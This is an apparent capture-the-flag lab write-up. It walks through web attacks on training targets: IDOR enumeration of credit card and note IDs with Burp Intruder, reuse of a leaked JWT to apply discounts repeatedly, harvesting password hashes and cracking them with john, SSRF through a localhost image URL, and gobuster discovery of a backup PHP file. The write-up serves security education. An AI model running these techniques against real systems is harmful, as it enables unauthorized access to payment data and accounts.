# GlockenEmil 2.0 – DOR Direct Object Reference

- watched Request and Response of the credit card info page via Burp Proxy
- noticed that credit card infos are requested via an API and we assume the random number is the credit card identifier

```api
GET /api/creditcard/account/5aa0481e876d9d39d4397859

https://0edbe9c2-a3fd-4437-85d2-7ab49dca6ec1.idocker.vuln.land/api/creditcard/account/5aa0481e876d9d39d4397859
```

- based on that we tried to use the Intruder of Burp to iterate through possible identifiers. We used the `Snipe` attack type. We only tried to iterate through the last character from `0-f`

```api
GET /api/creditcard/account/5aa0481e876d9d39d439785§9§
```

- based on the status code `200` of the attacks we knew that `c` and `f` were other credit cards from other customers

```url
https://0edbe9c2-a3fd-4437-85d2-7ab49dca6ec1.idocker.vuln.land/api/creditcard/account/5aa0481e876d9d39d439785c

https://0edbe9c2-a3fd-4437-85d2-7ab49dca6ec1.idocker.vuln.land/api/creditcard/account/5aa0481e876d9d39d439785f
```

```json
{
  "statusCode": 200,
  "data": {
    "creditCards": [
      {
        "_id": "5aa0481e876d9d39d439785d",
        "number": "4900000000000086",
        "type": "Visa",
        "cvv": "117",
        "month": 4,
        "_account": "5aa0481e876d9d39d439785c",
        "createdAt": "2018-03-07T20:14:22.546Z",
        "updatedAt": "2023-10-15T07:54:47.467Z",
        "__v": 0,
        "year": 2023
      }
    ]
  },
  "message": null
}
```

```json
{
  "statusCode": 200,
  "data": {
    "creditCards": [
      {
        "_id": "5aa0481e876d9d39d4397860",
        "number": "5404000000000002",
        "type": "Mastercard",
        "cvv": "570",
        "month": 5,
        "_account": "5aa0481e876d9d39d439785f",
        "createdAt": "2018-03-07T20:14:22.552Z",
        "updatedAt": "2023-10-15T07:54:47.466Z",
        "__v": 0,
        "year": 2024
      }
    ]
  },
  "message": null
}
```

- the problem is that the application does not check if the authorized user is accessing his own credit card information or another customers information

# A Cookie for a Hacker

- watched request and response of the note app via Burp
- after registering we noticed that the notes are requested via an API endpoint `/api/get_notes`

```http
https://c94b3308-7020-423d-9fe8-11ce53a541e3.idocker.vuln.land/api/get_notes
```

- in the request header the cookies `auth_cookie` and `user_id` are sent. For us the `user_id` is relevant and we're trying to use the Intruder and start an attack on the `user_id`

```http
Cookie: auth_cookie=eb0b6beb57d7dd55f8bcd5bda33d21786e968fff91b11aee9537515ad39f34ff; user_id=1473
```

- because we registered just recently, we're assuming that we're the last added user and our ID is the highest in the DB -> so we defined the range from `0-1473`

- we filtered the results based on the `length` and the `user_id=83` was a note from another user

```json
[
  "Hello, this is a super secure admin note",
  "buy some eggs",
  "flag{N0tes_N0t_so_S3cure_1861215}"
]
```

- the problem is again that the application does not check if the authorized user is accessing his own notes resp. resources or another ones

# GlockenEmil 2.0 – JWT

- watched request and response of the shop api via Burp
- after a lot of back and forth and help from the lecturer we realized we need to access the `/api` endpoint for further infos
- the endpoint `/api/retailer/order/:orderId/applyDiscount/` was described and the JWT seemed like a valid token after checking on jwt.io

```json
{
  "isRetailer": true,
  "_id": "5acc851fc8bc262214c01ee5",
  "username": "retailer0",
  "firstname": "Jackob",
  "lastname": "Müller",
  "email": "Jackob.Mueller@gmail.com",
  "iat": 1523354622,
  "aud": "self",
  "iss": "webshop"
}
```

- based on that we prepared the discount endpoint for our order id

```http
GET /api/retailer/order/5acb4be9d9520729d8638c9a/applyDiscount HTTP/1.1
Host: 95603127-9f6e-42ae-bc28-9763beffeb13.idocker.vuln.land
Connection: Close
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc1JldGFpbGVyIjp0cnVlLCJfaWQiOiI1YWNjODUxZmM4YmMyNjIyMTRjMDFlZTUiLCJ1c2VybmFtZSI6InJldGFpbGVyMCIsImZpcnN0bmFtZSI6IkphY2tvYiIsImxhc3RuYW1lIjoiTcO8bGxlciIsImVtYWlsIjoiSmFja29iLk11ZWxsZXJAZ21haWwuY29tIiwiaWF0IjoxNTIzMzU0NjIyLCJhdWQiOiJzZWxmIiwiaXNzIjoid2Vic2hvcCJ9.7eDbsqhJ0jyXdKWsjyVgpT5ZL6JIWlBMH8laQ6XYghQ
```

- we requested the discount more than once until the price was `92.19 CHF` from `2950 CHF`

- the fundamental security issue at hand is that the REST API documentation was accessible to everyone. This presents a vulnerability, as an attacker could potentially access and scrutinize all listed endpoints, attempting attacks on them. Another security concern emerged in the API documentation, where a valid JWT token was employed

# SCHOGGI: API Excessive Data Exposure

- watched request and response of the shop via Burp
- noticed that the endpoint `/api/users` returns a lot of data

```json
[
  { "uid": 101, "username": "alice", "picture": "user101.png", "role": "user" },
  ...
]
```

- we tried to access `/api/user/101` to get infos for one specific user

```url
https://851b60ad-81a1-4bd0-a4a1-98585c56b1c0.idocker.vuln.land/api/user/101/
```

```json
{
  "address": "Boulder Avenue 6",
  "credit_card": "2034 8857 0007 8024",
  "password_hash": "765adadbce1bcddb3bcbdbf7c8e312b5f3fd6b1fa278b8d884eb1cb8552fb1a1",
  "phone": "+41 760 603 132",
  "picture": "user101.png",
  "role": "user",
  "uid": 101,
  "username": "alice"
}
```

- after accessing all user infos we prepared the `hashes.txt` file

```txt
alice:765adadbce1bcddb3bcbdbf7c8e312b5f3fd6b1fa278b8d884eb1cb8552fb1a1
bob:985089972f3b4fc822a99bb38b6051935954944265f932a88e6e265bb9d2f90c
charlie:5cb7285acef8307dd824faa96b4956971730641083237f393bded9591ff10eae
eve:abbf8e6e2dd434cfa8545f7972045ef7fdf28a1e2a0fda258776d8189ed11875
victor:13a5c202e320d0bf9bb2c6e2c7cf380a6f7de5d392509fee260b809c893ff2f9
peggy:a0fc1cc4cfee7292d7d285aedb1ef3845332b64b04340ce6e3ee87f483396af4
mallory:522c804c591605b0d9b27483b16b6227caa4dfeecd725c459e3de9de635fb228
```

- to find out which hash function was used, we let an [online site](https://www.tunnelsup.com/hash-analyzer/) detect that -> `SHA2-256`

- based on that we prepared the john statement

```sh
john hashes.txt --format=raw-sha256 --wordlist=10-million-password-list-top-10000.txt
```

```sh
q1w2e3r4         (victor)
```

# GlockenEmil 2.0 - SSRF Server Side Request Forgery

- on the first page we see a broken picture. After inspecting the URL we noticed the internal URL that is used to store pictures

```url
https://069c3f58-1073-45a5-a6ff-4f8858a6beca.idocker.vuln.land/post-images/http://localhost:8765/file001.jpg
```

- based on that we tried to create a community post ourselves. For the image URL we used the `localhost` directly

```url
http://localhost:8765/file001.jpg
```

- we tried to create another post but this time with `files002.jpg`

```
java -> iLikeTrains
```

# Historia Animalum

- prepared and executed the gobuster command

```sh
gobuster dir -d -e -u https://742faade-8b87-424d-adb6-c85129821041.idocker.vuln.land/ -w /usr/share/wordlists/dirb/common.txt
```

```sh
> gobuster dir -d -e -u https://742faade-8b87-424d-adb6-c85129821041.idocker.vuln.land/ -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://742faade-8b87-424d-adb6-c85129821041.idocker.vuln.land/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2023/10/18 23:43:36 Starting gobuster in directory enumeration mode
===============================================================
https://742faade-8b87-424d-adb6-c85129821041.idocker.vuln.land/css                  (Status: 301) [Size: 169] [--> http://742faade-8b87-424d-adb6-c85129821041.idocker.vuln.land/css/]
https://742faade-8b87-424d-adb6-c85129821041.idocker.vuln.land/index.php~           (Status: 200) [Size: 5021]
https://742faade-8b87-424d-adb6-c85129821041.idocker.vuln.land/index.php            (Status: 200) [Size: 4134]
Progress: 31511 / 32305 (97.54%)
===============================================================
2023/10/18 23:43:50 Finished
===============================================================
```

- we noticed that there is a `index.php` and `index.php~` files
- based on that we accessed `index.php~` endpoint and downloaded the file
- we then saw the actual code used to show the secret
- by setting the `page` param to `($page === '$_SERVER[REMOTE_ADDR]')` we will always reach the `echo` command, because of the misplacement of the quotes.
- further by setting the `secret` param to `5e8586c3355551da6d48a5aa10dd7b85ca93404c0f1a7ead6cd1343f45320b3b` the echo command should always be executed, because the hash that the code tries to find is hardcoded
- based on this premise we prepared the URL

```url
https://742faade-8b87-424d-adb6-c85129821041.idocker.vuln.land/index.php?page=$_SERVER[REMOTE_ADDR]&secret=5e8586c3355551da6d48a5aa10dd7b85ca93404c0f1a7ead6cd1343f45320b3b
```

```txt
FLAG = 5abf5739-ed71-4ca6-b780-8bd45dd35832
```
